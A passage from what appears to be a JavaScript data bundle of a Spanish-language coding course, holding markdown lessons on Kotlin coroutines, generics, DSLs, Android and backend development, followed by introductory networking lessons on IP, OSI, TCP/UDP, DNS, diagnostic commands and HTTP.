Son "light-weight threads". Puedes tener 1 milln de Corrutinas en un solo hilo del sistema operativo.
\`\`\`kotlin
import kotlinx.coroutines.*

fun main() {
    GlobalScope.launch { // Crea una corrutina
        delay(1000L) // Pausa de 1 segundo (no bloquea el hilo)
        println("Mundo!")
    }
    println("Hola,")
    Thread.sleep(2000L) // Espera a que termine la corrutina
}
\`\`\`

## 3. Suspend Functions
Una funcin con la palabra clave \`suspend\` solo puede ser llamada desde otra \`suspend\` o dentro de una corrutina.
\`\`\`kotlin
suspend fun tareaPesada(): Int {
    delay(1000L)
    return 42
}
\`\`\`

## 4. Async / Await
Para operaciones paralelas que devuelven un resultado.
\`\`\`kotlin
val resultado1 = async { tareaPesada() }
val resultado2 = async { tareaPesada() }

// Espera a que ambas terminen (Corre en paralelo)
println(resultado1.await() + resultado2.await())
\`\`\`

---

### Misin Concurrente:
Nunca uses \`GlobalScope\` en produccin. Usa un \`CoroutineScope\` atado al ciclo de vida de tu componente (ej: \`viewModelScope\` en Android) para evitar Fugas de Memoria.
`,completed:!1},{id:"kotlin-11-practica-semi-senior",title:"Prctica Kotlin Semi-Senior: El Gestor de Estados Asncronos",level:"semi-senior",content:'# Prctica Kotlin Semi-Senior: El Gestor de Estados Asncronos\n\nEs hora de usar Corrutinas y Clases Selladas para modelar un sistema moderno.\n\n---\n\n## 1. El Estado (Sealed Class)\nModela un proceso de login:\n*   `sealed class LoginState`\n*   `object Loading : LoginState()`\n*   `data class Success(val token: String) : LoginState()`\n*   `data class Error(val msg: String) : LoginState()`\n\n## 2. La API Asncrona (Coroutines)\nCrea una clase `AuthRepo`:\n*   Mtodo `suspend fun login(user: String): LoginState`\n*   Simula una espera de 2 segundos (`delay(2000)`).\n*   Si el usuario es "admin", retorna `Success("abc-123")`.\n*   Si no, retorna `Error("Credenciales invlidas")`.\n\n## 3. El Consumidor (Main)\nEn el mtodo `main` (usando `runBlocking` para simplicidad):\n1.  Inicia el estado en `Loading`. Imprime "Cargando...".\n2.  Llama a `login("admin")` dentro de una corrutina (`launch`).\n3.  Usa un `when` exhaustivo para imprimir el resultado final ("Bienvenido token..." o "Error...").\n\n---\n\n### Misin:\nUn desarrollador Semi-Senior maneja el estado de su aplicacin de forma predecible y segura, evitando sorpresas nulas y condiciones de carrera.\n',completed:!1,isProject:!0},{id:"kotlin-12-generics-reified",title:"Generics Avanzados (Reified, In, Out)",level:"senior",content:'# Leccin 12: Generics Avanzados (Reified, In, Out)\n\nLos genricos en Java tienen "Type Erasure". En Kotlin, con `inline` y `reified`, podemos recuperar los tipos en tiempo de ejecucin.\n\n## 1. Reified Type Parameters\nNormalmente no puedes hacer `if (obj is T)`. T no existe en runtime.\nPero si usas `inline`, el compilador "copia y pega" el cdigo, incluyendo el tipo real.\n```kotlin\ninline fun <reified T> filtrarPorTipo(lista: List<Any>): List<T> {\n    return lista.filterIsInstance<T>()\n}\n\nval lista = listOf(1, "Hola", 2, "Mundo")\nval strings = filtrarPorTipo<String>(lista) // ["Hola", "Mundo"]\n```\n\n## 2. Varianza (`in` y `out`)\n*   **Productor (`out`):** Solo lees datos (Covarianza). `List<out T>`.\n    *   `List<String>` es subtipo de `List<Any>`.\n*   **Consumidor (`in`):** Solo escribes datos (Contravarianza). `Comparable<in T>`.\n    *   `Comparable<Any>` puede comparar Strings.\n\n---\n\n### Misin Senior:\n`reified` es muy poderoso para parsear JSON con libreras como Gson o Jackson sin pasar `Class<T>` como argumento. `parseJson<Usuario>(json)`.\n',completed:!1},{id:"kotlin-13-delegacion-dsls",title:"Delegacin (Delegated Properties) y DSLs",level:"senior",content:`# Leccin 13: Delegacin (Delegated Properties) y DSLs

Escribir cdigo que parece prosa. El sueo de Kotlin.

## 1. Delegacin de Propiedades (\`by\`)
No implementes getters/setters repetitivos. Deja que otro objeto lo haga.
*   **by lazy:** Inicializacin perezosa (solo se crea la primera vez que se accede).
*   **by observable:** Ejecuta cdigo cuando el valor cambia.

\`\`\`kotlin
val pesado: String by lazy {
    println("Calculando...")
    "Resultado costoso"
}

var nombre: String by Delegates.observable("Nadie") { _, viejo, nuevo ->
    println("Cambi de $viejo a $nuevo")
}
\`\`\`

## 2. Creacin de DSLs (Domain Specific Languages)
Usando Lambdas con Receiver (\`String.() -> Unit\`).
Esto permite crear estructuras anidadas como HTML.
\`\`\`kotlin
fun html(bloque: HTML.() -> Unit): HTML {
    val h = HTML()
    h.bloque()
    return h
}

// Uso del DSL
val pagina = html {
    head { title = "Mi Pgina" }
    body {
        h1("Bienvenido")
        p("Esto es un DSL en Kotlin")
    }
}
\`\`\`
Bibliotecas como **Ktor** (Backend/Cliente) y **Jetpack Compose** (UI) se basan enteramente en esto.

---

### Misin Senior:
Los DSLs son poderosos pero difciles de depurar. salos para configurar sistemas complejos (como validacin o routing), no para lgica de negocio trivial.
`,completed:!1},{id:"kotlin-14-kmp-flow",title:"Kotlin Multiplatform (KMP) y Corrutinas Avanzadas (Flow)",level:"senior",content:`# Leccin 14: Kotlin Multiplatform (KMP) y Corrutinas Avanzadas (Flow)

El futuro es compartir cdigo entre Android, iOS y Backend.

## 1. Kotlin Multiplatform (Common Code)
Escribes la lgica una vez (\`commonMain\`).
*   **Expect:** Defines una interfaz en el mdulo comn (ej: \`expect fun randomUUID(): String\`).
*   **Actual:** Implementas la funcin en cada plataforma (Android usa \`java.util.UUID\`, iOS usa \`NSUUID\`).
*   Compartes: Modelos de datos, Validaciones, Redes (Ktor client), Base de datos (SQLDelight).

## 2. Shared Flows y State Flows (Reactive)
**Flow** es la versin Kotlin de RxJava (Streams reactivos y fros).
*   **Cold Flow:** Solo empieza cuando alguien suscribe (\`collect\`).
*   **StateFlow (Hot):** Mantiene el ltimo valor (ideal para UI State).
*   **SharedFlow (Hot):** Emite eventos puntuales (ej: "Error de red", "Login exitoso").

\`\`\`kotlin
class MyViewModel : ViewModel() {
    private val _state = MutableStateFlow("Cargando...")
    val state = _state.asStateFlow() // Exponer solo lectura

    fun cargarDatos() {
        viewModelScope.launch {
            _state.value = "Datos listos" // Actualiza la UI reactivamente
        }
    }
}
\`\`\`

---

### Misin Senior:
El patrn MVVM en Android se basa en exponer **Estados** (\`StateFlow\`) inmutables desde el ViewModel y consumirlos en la UI (Activity/Fragment/Compose).
`,completed:!1},{id:"kotlin-15-practica-senior",title:"Prctica y Evaluacin: Arquitecto Kotlin Senior",level:"senior",content:`# Prctica y Evaluacin: Arquitecto Kotlin Senior

Ya no eres un usuario de Kotlin, eres un **creador** de herramientas.

---

## 1. El Constructor de JSON (DSL y Reified)
**Consigna:** Crea un Mini-DSL para construir JSON de forma typesafe.
*   Debe permitir anidar objetos y arrays.
\`\`\`kotlin
val json = json {
    prop("nombre", "Octavio")
    obj("direccion") {
        prop("calle", "Falsa 123")
    }
    arr("hobbies") {
        add("Leer")
        add("Programar")
    }
}
// Resultado: {"nombre": "Octavio", "direccion": {"calle": "Falsa 123"}, "hobbies": ["Leer", "Programar"]}
\`\`\`

## 2. El Observador Reactivo (Flow / StateFlow)
**Escenario:**
*   Crea un \`class SensorTemperatura\` que emita valores aleatorios cada 500ms usando un \`Flow\`.
*   Crea un \`class Monitor\` que se suscriba (\`collect\`) a este flujo.
*   El monitor debe filtrar temperaturas menores a 20C y transformar las dems a Fahrenheit (\`map\`).
*   Imprime solo si la temperatura cambia respecto a la anterior (\`distinctUntilChanged\`).

## 3. Delegacin Personalizada
**Consigna:**
*   Crea un delegado \`var stringSinEspacios: String by TrimDelegate()\`.
*   Si asignas \`"  Hola   "\`, al leerlo debe devolver \`"Hola"\`.
*   Implementa la interfaz \`ReadWriteProperty\`.

---

### Resultado esperado:
Cdigo limpio, expresivo y con un diseo que aproveche las caractersticas avanzadas del lenguaje para simplificar la vida del desarrollador que lo use.
`,completed:!1,isProject:!0},{id:"kotlin-16-backend-ktor-spring",title:"Kotlin en Backend (Ktor y Spring Boot)",level:"senior",content:`# Leccin 16: Kotlin en Backend (Ktor y Spring Boot)

Kotlin no es solo para mviles. En el servidor, brilla con corrutinas y DSLs.

## 1. Spring Boot con Kotlin
Es igual que Java, pero ms corto.
\`\`\`kotlin
@RestController
@RequestMapping("/api/users")
class UserController(val service: UserService) { // Inyeccin por constructor automtica

    @GetMapping
    fun getAll() = service.findAll() // Single-expression
}
\`\`\`
**Hibernate y Kotlin:**
Debes usar el plugin \`all-open\` en Gradle, porque las clases en Kotlin son \`final\` por defecto y Hibernate necesita heredar de ellas (proxies).

## 2. Ktor (El Framework Nativo)
Creado por JetBrains. 100% Kotlin, asncrono y ligero. Usa DSLs para todo.
\`\`\`kotlin
fun main() {
    embeddedServer(Netty, port = 8080) {
        routing {
            get("/") {
                call.respondText("Hola Mundo desde Ktor!")
            }
            get("/json") {
                call.respond(mapOf("mensaje" to "Soy un JSON"))
            }
        }
    }.start(wait = true)
}
\`\`\`
No hay anotaciones mgicas, todo es cdigo explcito.

---

### Misin Backend:
Si vienes de Java Enterprise, Spring Boot te har sentir en casa. Si vienes de Node.js o Go, amars **Ktor** por su ligereza y control.
`,completed:!1},{id:"kotlin-17-android-jetpack",title:"Kotlin en Android (Jetpack y MVVM)",level:"senior",content:`# Leccin 17: Kotlin en Android (Jetpack y MVVM)

El 98% de las apps modernas de Android usan Kotlin. Por qu? Porque **Jetpack Compose** (la UI declarativa) solo existe en Kotlin.

## 1. La Arquitectura Moderna
*   **Activity/Fragment:** La "vista" tradicional. Se encarga del ciclo de vida (Android es complicado con esto).
*   **Jetpack Compose:** La nueva forma de construir UI con funciones \`@Composable\`. Adis XML.

\`\`\`kotlin
@Composable
fun Saludo(nombre: String) {
    Text(text = "Hola $nombre!")
}
\`\`\`

## 2. ViewModel y StateFlow
El **ViewModel** sobrevive si rotas la pantalla (destruccin y recreacin de Activity).
El estado viaja desde el ViewModel hacia la UI.
\`\`\`kotlin
class MainViewModel : ViewModel() {
    private val _uiState = MutableStateFlow("Cargando...")
    val uiState: StateFlow<String> = _uiState

    fun onEvent() { _uiState.value = "Datos Listos" }
}
\`\`\`

## 3. Integracin con Bases de Datos (Room)
Room es la librera oficial de SQLite. Usa anotaciones y corrutinas.
\`\`\`kotlin
@Dao
interface UserDao {
    @Query("SELECT * FROM users")
    fun getAll(): Flow<List<User>> // Reactivo! Si la DB cambia, la UI se actualiza sola.

    @Insert
    suspend fun insert(user: User) // Suspendible para no bloquear la UI.
}
\`\`\`

---

### Misin Android:
Nunca bloquees el **Main Thread** en Android. Si haces una operacin de red o DB en el hilo principal, la app se congela y sale el temido dilogo "Application Not Responding (ANR)". Usa \`viewModelScope.launch { ... }\`.
`,completed:!1},{id:"kotlin-18-testing-mockk",title:"Testing en Kotlin (Mockk y Kotest)",level:"senior",content:`# Leccin 18: Testing en Kotlin (Mockk y Kotest)

Kotlin tiene frameworks de testing diseados especficamente para el lenguaje, aprovechando su sintaxis expresiva.

## 1. Mockk (El Mockito de Kotlin)
Mockito funciona en Kotlin, pero "Mockk" es mejor. Soporta mtodos finales, objetos estticos y corrutinas de forma nativa.
\`\`\`kotlin
val service = mockk<UserService>()
every { service.getUser(1) } returns User("Octavio")

// Verificacin
verify { service.getUser(1) }
\`\`\`

## 2. JUnit 5 con Kotlin
\`\`\`kotlin
class CalculadoraTest {
    @Test
    fun \`sumar dos numeros deberia dar correcto\`() { // Nombres con espacios!
        val resultado = sumar(2, 2)
        assertEquals(4, resultado)
    }
}
\`\`\`

## 3. Testing de Corrutinas
Para testear una \`suspend fun\`, necesitas \`runTest\` (de la librera \`kotlinx-coroutines-test\`).
Esto salta los \`delay()\` reales para que el test sea instantneo.
\`\`\`kotlin
@Test
fun \`test asincrono\`() = runTest {
    val dato = repo.getData() // Funcin suspendida
    assertEquals("Info", dato)
}
\`\`\`

---

### Misin Testing:
Usa nombres de tests descriptivos con "backticks" (\\\`). Es una feature nica de Kotlin que hace los reportes mucho ms legibles. \`fun \\\`el usuario no deberia poder loguearse con password vacio\\\`()\`.
`,completed:!1},{id:"kotlin-19-arquitectura-modular",title:"Arquitectura Limpia y Modularizacin en Kotlin",level:"senior",content:`# Leccin 19: Arquitectura Limpia y Modularizacin en Kotlin

En proyectos grandes, el mayor enemigo es el acoplamiento.

## 1. Modularizacin Vertical ("Por Feature")
En lugar de tener carpetas \`ui\`, \`data\`, \`domain\`, dividimos por funcionalidad:
*   \`:features:login\`
*   \`:features:profile\`
*   \`:features:checkout\`
*   \`:core:network\`
*   \`:core:database\`

**Ventaja:** Compilacin ms rpida (Gradle solo recompila el mdulo que tocaste) y posibilidad de reutilizar features en otras apps.

## 2. Inyeccin de Dependencias (Koin vs Hilt)
*   **Hilt (Dagger):** Generacin de cdigo en tiempo de compilacin. Estndar en Android.
*   **Koin:** Service Locator en tiempo de ejecucin. 100% Kotlin DSL. Ms fcil de aprender, pero un poco menos performante en startup.
\`\`\`kotlin
// Mdulo Koin
val appModule = module {
    single<UserRepository> { UserRepositoryImpl(get()) }
    viewModel { UserViewModel(get()) }
}
\`\`\`

## 3. Clean Architecture (Domain Driven)
1.  **Domain:** Entidades puras y UseCases. (Sin Android, sin Retrofit, sin Room).
2.  **Data:** Implementacin de repositorios. Mapper de DTO a Dominio.
3.  **Presentation:** ViewModel y UI (Compose/XML).

---

### Misin Senior:
Usa el modificador \`internal\` en Kotlin. Hace que una clase sea visible SOLO dentro del mismo mdulo Gradle. Esto fuerza a que nadie "desde fuera" toque tus partes internas. Es la clave del encapsulamiento modular.
`,completed:!1},{id:"kotlin-20-performance-inline",title:"Performance y Escalabilidad (Inline y Corrutinas)",level:"senior",content:'# Leccin 20: Performance y Escalabilidad (Inline y Corrutinas)\n\nEscribir cdigo en Kotlin es un placer, pero tiene sus trampas de rendimiento si no sabes cmo compila.\n\n## 1. Inline Classes (`value class`)\nSi tienes un ID que es un String, podras confundir `userId` con `productId`.\n```kotlin\n@JvmInline\nvalue class UserId(val id: String)\n\nfun login(id: UserId) { ... }\n// Esto compila como un String puro en bytecode, sin el "Overhead" de un Objeto.\n```\n\n## 2. Inlined Lambdas (`noinline` / `crossinline`)\nLas funciones de orden superior (`list.map`) crean objetos Lambda en memoria.\n*   Si usas `inline` en tu funcin: El compilador copia el cdigo de la lambda DENTRO de la funcin. **Cero overhead.**\n\n## 3. Dispatchers y Concurrencia Masiva\n*   `Dispatchers.Main`: UI (Android).\n*   `Dispatchers.IO`: Red/Disco. Tiene un pool gigante (64+ hilos) porque los hilos se bloquean esperando I/O.\n*   `Dispatchers.Default`: CPU (JSON parsing, clculos). Tiene tantos hilos como Cores tenga tu CPU.\n\n**Cuello de botella:** Si haces JSON parsing en `Dispatchers.IO`, saturas los hilos y bloqueas la red. Si haces Red en `Dispatchers.Default`, bloqueas el CPU esperando respuestas. Usa el Dispatcher correcto!\n\n---\n\n### Misin Senior:\nUsa `Sequence` en lugar de `Iterable` para operaciones encadenadas largas (`list.map.filter.groupBy`). Evita crear colecciones intermedias y procesa elemento por elemento (Lazy Evaluation).\n',completed:!1},{id:"kotlin-21-seguridad-contracts",title:"La Seguridad en Kotlin (Null Safety y Contracts)",level:"senior",content:'# Leccin 21: La Seguridad en Kotlin (Null Safety y Contracts)\n\nEl sistema de tipos de Kotlin es tu amigo, pero puedes abusar de l.\n\n## 1. El Peligro del `!!` (Not-null Assertion)\n*   **Problema:** `val len = data!!.length`. Lanza `NPE` si `data` es `null`.\n*   **Diagnstico:** Por qu lo usaste? Porque "estabas seguro"? Y si el backend cambia y enva null?\n*   **Solucin:** `checkNotNull(data) { "Data no puede ser null en esta parte del flujo" }`.\n    *   Lanza una `IllegalStateException` con mensaje claro. Mucho mejor que un NPE genrico.\n\n## 2. Smart Casts y Contracts\nSi verificas que `obj is String`, el compilador sabe que dentro del `if` es un String.\n```kotlin\nfun procesar(obj: Any) {\n    if (obj !is String) return\n    println(obj.length) // Compila!\n}\n```\n**Contracts:** Puedes ensear al compilador tus propias reglas.\n```kotlin\n@OptIn(ExperimentalContracts::class)\nfun requireString(x: Any?) {\n    contract { returns() implies (x is String) }\n    if (x !is String) throw IllegalArgumentException()\n}\n```\n\n## 3. Inmutabilidad por Defecto\nEn seguridad, el estado mutable compartido es el ENEMIGO.\n*   Kotlin fuerza `val` (lectura) sobre `var` (escritura).\n*   Las listas son `List` (lectura) por defecto, no `MutableList`.\n*   Esto previene condiciones de carrera y efectos colaterales.\n\n---\n\n### Misin de Seguridad:\nNunca expongas `MutableList` o `MutableStateFlow` fuera de tu clase. Expn siempre la versin inmutable (`List` o `StateFlow`). Encapsulamiento defensivo.\n',completed:!1},{id:"kotlin-22-errores-comunes",title:"Errores Comunes en Kotlin (Gotchas)",level:"senior",content:'# Leccin 22: Errores Comunes en Kotlin (Gotchas)\n\nKotlin es seguro, pero no es mgico. Aqu tienes las trampas donde caen todos al principio.\n\n## 1. Abuso de `!!` (Not-Null Assertion)\n*   **Error:** `usuario!!.nombre`.\n*   **Por qu:** Ests desactivando la seguridad del lenguaje. Si es null, explota.\n*   **Solucin:** Usa `?.` (Safe Call) o `?:` (Elvis Operator). O refactoriza para que la variable no sea nullable.\n\n## 2. No usar `data class` para DTOs\n*   **Error:** `class Usuario(val nombre: String)`.\n*   **Por qu:** `println(usuario)` imprimir `Usuario@5f184fc`. `usuario1 == usuario2` dar `false` aunque tengan el mismo nombre.\n*   **Solucin:** `data class Usuario(...)`. Te da `toString()`, `equals()` y `hashCode()` gratis.\n\n## 3. Confundir `List` (Lectura) con `MutableList`\n*   **Error:** Tratar de hacer `.add()` en una `List`.\n*   **Por qu:** `List` en Kotlin es inmutable por contrato (aunque por debajo sea un ArrayList de Java).\n*   **Solucin:** Usa `mutableListOf()` solo si realmente necesitas modificarla.\n\n## 4. Capturar estado mutable en Lambdas\n*   **Error:**\n    ```kotlin\n    var contador = 0\n    list.forEach {\n        contador++ // Peligro en paralelo!\n    }\n    ```\n*   **Por qu:** Las lambdas no son thread-safe por magia.\n*   **Solucin:** Usa `AtomicInteger` o, mejor an, operaciones funcionales como `fold` o `count`.\n\n## 5. Olvidar `open` en clases para herencia\n*   **Error:** `class Padre { ... } class Hijo : Padre()`.\n*   **Por qu:** Error de compilacin. Las clases son `final` por defecto.\n*   **Solucin:** `open class Padre`. (O mejor: prefiere composicin sobre herencia).\n\n---\n\n### Misin de Calidad:\nSi tu cdigo Kotlin parece Java traducido lnea por lnea, lo ests haciendo mal. Busca la forma "idiomtica" (Kotlin-way).\n',completed:!1},{id:"kotlin-23-roadmap-kotlin",title:"Roadmap Kotlin - Tu Carrera en la JVM",level:"senior",content:`# Leccin 23: Roadmap Kotlin - Tu Carrera en la JVM

Hacia dnde ir ahora? El ecosistema Kotlin es gigante.

## Camino 1: El Desarrollador Android Moderno
*   **Foco:** Aplicaciones mviles nativas.
*   **Aprender:**
    *   **Core:** Activity, Fragment, Ciclo de Vida.
    *   **UI Declarativa:** Jetpack Compose (Indispensable hoy).
    *   **Clean Arch:** ViewModel, StateFlow, Room DB.
    *   **Red:** Retrofit + Corrutinas.
    *   **Inyeccin:** Hilt / Koin.
    *   **CI/CD:** GitHub Actions para publicar en Play Store.

## Camino 2: El Desarrollador Backend (Ktor/Spring)
*   **Foco:** APIs robustas y Microservicios.
*   **Aprender:**
    *   **Ktor:** DSLs, Plugins, Autenticacin (JWT), Websockets.
    *   **Spring Boot:** JPA, Security, Cloud, pero con sintaxis Kotlin.
    *   **Bases de Datos:** **Exposed** (ORM de Kotlin) o SQLDelight.
    *   **Testing:** TestContainers, Mockk.

## Camino 3: El Multiplatform Ninja (KMP)
*   **Foco:** Escribir una vez, correr en todas partes.
*   **Aprender:**
    *   Configuracin de Gradle Multiplatform.
    *   Compartir Lgica (\`commonMain\`).
    *   **UI Compartida:** Compose Multiplatform (Android + iOS + Desktop).
    *   **Libreras KMP:** SQLDelight, Ktor Client, Koin.

---

### Misin Final:
Kotlin es un lenguaje pragmtico y expresivo. No busques la solucin ms "compleja", busca la ms "legible". Disfruta programando!
`,completed:!1}]},rv={id:"logic",title:"Logic (En recuperacin)",description:"Contenido educativo siendo restaurado.",completed:!1,lessons:[]},sv={id:"mathbasic",title:"Mathbasic (En recuperacin)",description:"Contenido educativo siendo restaurado.",completed:!1,lessons:[]},Qx={id:"networking",title:"Redes para Desarrolladores",description:"Entiende cmo viajan los datos por el cable y el aire. Desde fundamentos de IP hasta arquitecturas de red complejas en la nube.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"net-01-fundamentos",title:"Fundamentos: IP, Puertos e Internet",level:"junior",content:`# Leccin 1: Qu es una Red y cmo funciona Internet?

Para un desarrollador, una red no es ms que un conjunto de computadoras que intercambian mensajes. Entender cmo viajan estos mensajes es crucial para depurar aplicaciones y entender latencias.

## 1. Qu es una Red?
Es una infraestructura (cables, ondas de radio, satlites) que permite conectar nodos. 
*   **LAN (Local Area Network):** Tu casa o la oficina.
*   **WAN (Wide Area Network):** Conecta ciudades o pases.
*   **Internet:** Es la "Red de Redes". No es una entidad central cerrada, sino millones de redes privadas y pblicas conectadas entre s mediante protocolos estndar.

## 2. Direcciones IP: Tu documento de identidad
Cada dispositivo en una red necesita una direccin para ser encontrado.
*   **IPv4:** 4 nmeros (ej: \`192.168.1.1\`). Se estn agotando.
*   **IPv6:** Mucho ms largas y complejas (ej: \`2001:0db8:85a3:0000:0000:8a2e:0370:7334\`).

## 3. Puertos: Las puertas de tu casa
Si la IP es la direccin de tu edificio, el **puerto** es el nmero de departamento.
*   Tu computadora puede tener cientos de aplicaciones abiertas. Cada aplicacin "escucha" en un puerto especfico.
*   **Puertos comunes:**
    *   \`80\`: HTTP (Web sin seguridad)
    *   \`443\`: HTTPS (Web segura)
    *   \`5432\`: PostgreSQL
    *   \`3306\`: MySQL

---

### Misin Junior:
Abre una terminal y escribe \`ipconfig\` (Windows) o \`ifconfig/ip a\` (Linux/Mac). Identifica tu "Direccin IPv4". Esa es tu identidad dentro de tu red local.
`,completed:!1},{id:"net-02-modelo-osi",title:"Modelo OSI: Las 7 Capas de la Red",level:"junior",content:`# Leccin 2: El Modelo OSI (Explicado Simple)

El modelo OSI es un mapa mental de 7 capas que describe cmo viaja un dato desde tu aplicacin hasta el cable de red. No necesitas memorizar todo, pero s entender dnde trabajas t.

## Las 7 Capas del mapa:
1.  **Fsica:** Cables, fibra, seales elctricas.
2.  **Enlace de Datos:** Direcciones MAC (hardware de la placa de red).
3.  **Red:** Direcciones **IP** y Routers.
4.  **Transporte:** **TCP** y **UDP**. Asegura que los paquetes lleguen.
5.  **Sesin:** Mantiene la conexin abierta.
6.  **Presentacin:** Formatos de datos (JSON, encriptacin, compresin).
7.  **Aplicacin:** Donde vives t. Protocolos como **HTTP, FTP, SMTP**.

## Por qu importa?
Cuando un desarrollador dice "Tenemos un problema en capa 7", se refiere a que la red funciona bien, pero tu aplicacin (o servidor) est devolviendo un error (ej: un Error 500). Si dice "Es un problema de capa 3", significa que no hay conexin por IP.

---

### Misin Junior:
Entiende que como desarrollador Backend o Frontend, el 99% de tu tiempo estars en la **Capa 7 (Aplicacin)** moviendo JSONs, pero tus datos viajan por todas las capas inferiores de forma invisible.
`,completed:!1},{id:"net-03-tcp-udp",title:"TCP vs UDP: Confiabilidad vs Velocidad",level:"junior",content:`# Leccin 3: TCP vs UDP (Transporte)

En la capa de transporte, hay dos formas principales de enviar datos. Elegir la correcta define la velocidad y confiabilidad de tu app.

## 1. TCP (Transmission Control Protocol)
Es el protocolo "Corts y Seguro". Antes de enviar datos, establece una conexin (Handshake).
*   **Garanta:** Si un paquete se pierde, lo vuelve a pedir.
*   **Orden:** Los datos llegan exactamente en el orden que se enviaron.
*   **Uso:** Web (HTTP), Email, Transferencia de archivos (FTP), Bases de datos.

## 2. UDP (User Datagram Protocol)
Es el protocolo "Rpido y Despreocupado". Lanza los datos y no le importa si llegan o no.
*   **Garanta:** Ninguna. Si se pierde un dato, se perdi.
*   **Orden:** Pueden llegar desordenados.
*   **Uso:** Streaming de video (Netflix/YouTube), Videojuegos online, Llamadas de voz (Discord/WhatsApp), DNS.

## Cundo usar cada uno:
*   Si necesitas que el dato llegue sin errores (aunque tarde ms) -> **TCP**.
*   Si necesitas velocidad extrema y no importa si se pierde un pixel o medio segundo de audio -> **UDP**.

---

### Misin Junior:
Piensa en una partida de un juego online como Counter-Strike. Qu pasara si usara TCP? Si hay lag, el juego se congelara esperando los paquetes perdidos. En cambio, con UDP, simplemente ves un "teletransporte" y el juego sigue.
`,completed:!1},{id:"net-04-dns",title:"DNS: El Directorio Telefnico de Internet",level:"junior",content:`# Leccin 4: DNS (El Directorio Telefnico)

Internet no entiende nombres como \`google.com\`, solo entiende nmeros (IPs). El **DNS (Domain Name System)** es el encargado de traducir nombres humanos a direcciones de mquina.

## Cmo funciona el proceso?
1.  Escribes \`www.progravio.com\` en el navegador.
2.  Tu computadora le pregunta a un servidor DNS: "Qu IP tiene este nombre?".
3.  El servidor DNS responde: \`104.21.34.123\`.
4.  Tu navegador viaja a esa IP.

## Conceptos Clave:
*   **A Record:** Traduce un nombre a una IPv4.
*   **AAAA Record:** Traduce un nombre a una IPv6.
*   **CNAME:** Un alias. \`blog.tudominio.com\` apunta a \`tudominio.com\`.
*   **TTL (Time To Live):** Cunto tiempo se guarda la respuesta en memoria (cach) antes de volver a preguntar. Por eso los cambios de DNS a veces tardan horas en "propagarse".

---

### Misin Junior:
Abre tu terminal y usa el comando \`nslookup google.com\`. Vers la lista de IPs que corresponden a Google. Acabas de consultar un servidor DNS manualmente!
`,completed:!1},{id:"net-05-practica-junior",title:"Prctica Junior: Herramientas de Diagnstico",level:"junior",content:`# Prctica: Herramientas de Red para el Desarrollador

Un desarrollador junior debe saber usar las herramientas bsicas de diagnstico que vienen en cualquier sistema operativo.

---

## Reto 1: Comprobar Conectividad (PING)
El comando \`ping\` enva un pequeo paquete y espera respuesta.
*   **Misin:** Haz \`ping google.com\`. Observa el "time" (latencia en milisegundos). Si el tiempo es alto, tu conexin es lenta. Si dice "Timeout", el servidor no responde.

## Reto 2: Ver el Camino (TRACERT / TRACEROUTE)
Este comando muestra todos los "saltos" (routers) que hace tu mensaje hasta llegar a destino.
*   **Misin:** Haz \`tracert 8.8.8.8\` (Windows) o \`traceroute 8.8.8.8\` (Mac/Linux). Vers cmo tu mensaje pasa de tu router al de tu proveedor de internet, luego a otros pases, hasta llegar a Google.

## Reto 3: Puertos Abiertos (NETSTAT)
Qu aplicaciones estn escuchando en tu PC?
*   **Misin:** Ejecuta \`netstat -an\` (Windows) o \`sudo lsof -i -P -n\` (Mac/Linux). Identifica procesos usando el puerto 80 o 443.

---

### Solucin Sugerida (Misin cumplida):
Si lograste ver el tiempo de respuesta de un ping y los saltos de un tracert, ya tienes las bases para saber si un fallo es de tu cdigo o de la infraestructura de red.
`,completed:!1,isProject:!0},{id:"net-06-http",title:"HTTP y la Web: Mtodos, Status y Seguridad",level:"junior",content:`# Leccin 6: El protocolo HTTP y la Web

HTTP (HyperText Transfer Protocol) es el lenguaje universal que usan los navegadores y servidores para hablar entre s. Como desarrollador, este es el protocolo que ms usars en tu carrera.

## 1. Qu es HTTP?
Es un protocolo basado en **peticiones** (Request) y **respuestas** (Response). El cliente pide algo, el servidor responde algo.

## 2. Mtodos HTTP (Verbos)
Indican la accin que el cliente quiere realizar:
*   **GET:** Solicitar datos (no debe cambiar nada en el servidor).
*   **POST:** Enviar datos nuevos (ej: registrar un usuario).
*   **PUT:** Reemplazar un recurso existente (ej: actualizar todo el perfil).
*   **DELETE:** Eliminar un recurso.

## 3. Headers (Cabeceras)
Son metadatos que acompaan la peticin o respuesta:
*   \`Content-Type\`: Dice qu tipo de dato se enva (\`application/json\`, \`text/html\`).
*   \`Authorization\`: Contiene tokens de acceso para seguridad.
*   \`User-Agent\`: Identifica qu navegador o dispositivo hace la peticin.

## 4. Status Codes (Cdigos de Estado)
La respuesta del servidor siempre viene con un nmero:
*   **2xx (xito):** \`200 OK\`, \`201 Created\`.
*   **3xx (Redireccin):** \`301 Moved Permanently\`.
*   **4xx (Error del Cliente):** \`400 Bad Request\`, \`401 Unauthorized\`, \`404 Not Found\`.
*   **5xx (Error del Servidor):** \`500 Internal Server Error\`.

## 5. HTTPS y Seguridad
HTTPS es HTTP viajando sobre una capa segura (**TLS/SSL**).
*   **Encriptacin:** Nadie en el medio (ej: en el WiFi de una cafetera) puede leer tus datos.
*   **Certificados:** Asegura que el servidor es quien dice ser.

## 6. Cookies
Son pequeos trozos de texto que el servidor guarda en tu navegador.
*   Se usan principalmente para **mantener la sesin** (no tener que loguearte en cada click) y para preferencias del usuario.

---

### Misin Junior:
Abre tu navegador, presiona \`F12\` y ve a la pestaa **Network (Red)**. Carga cualquier pgina y observa las peticiones. Identifica el mtodo (GET), el Status Code (200) y los Headers de una de ellas.
`,completed:!1},{id:"net-07-handshake-websockets",title:"TCP Handshake, Latencia y WebSockets",level:"semi-senior",content:`# Leccin 7: TCP Handshake, Latencia y WebSockets

En el nivel Semi-Senior, dejamos de ver la red como un "tnel mgico" y empezamos a entender los mecanismos de negociacin y mantenimiento de conexiones de alta performance.

## 1. El TCP Three-Way Handshake
Antes de que se enve un solo byte de datos HTTP, TCP debe establecer una conexin confiable. Este proceso se llama "Handshake" y consta de tres pasos:
1.  **SYN (Synchronize):** El cliente enva un paquete con un nmero de secuencia inicial al servidor.
2.  **SYN-ACK (Synchronize-Acknowledgment):** El servidor responde confirmando la recepcin y enviando su propio nmero de secuencia.
3.  **ACK (Acknowledgment):** El cliente confirma la recepcin del servidor.
**Impacto:** Cada nueva conexin TCP requiere un viaje de ida y vuelta (Round Trip) completo antes de empezar. En redes lentas, esto introduce un retraso inicial notable.

## 2. Latencia (RTT)
La latencia es el tiempo que tarda un paquete en ir y volver (Round Trip Time). 
